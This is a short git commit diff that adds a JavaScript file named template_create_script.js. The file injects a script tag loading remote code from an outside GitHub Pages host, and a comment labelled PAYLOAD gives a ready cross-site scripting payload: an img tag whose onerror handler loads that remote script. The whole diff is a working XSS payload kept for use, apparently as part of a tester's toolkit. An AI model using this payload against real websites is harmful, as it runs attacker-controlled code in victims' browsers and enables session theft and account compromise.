83672339370159257b173967047b2b533521e7d9
MAVostrykh <>
2022-09-02 12:06:22 +0300

    example.js

---
+++ template_create_script.js
@@ -0,0 +1,15 @@
+s=document.createElement('script');
+s.setAttribute('src','https://morentharia.github.io/example.js');
+document.head.appendChild(s);
+
+/*
+
+
+s=document.createElement('script');s.setAttribute('src','https://morentharia.github.io/example.js');document.head.appendChild(s);
+
+PAYLOAD:
+<img src=x onerror="s=document.createElement('script');s.setAttribute('src','https://morentharia.github.io/example.js');document.head.appendChild(s);">
+
+
+
+*/
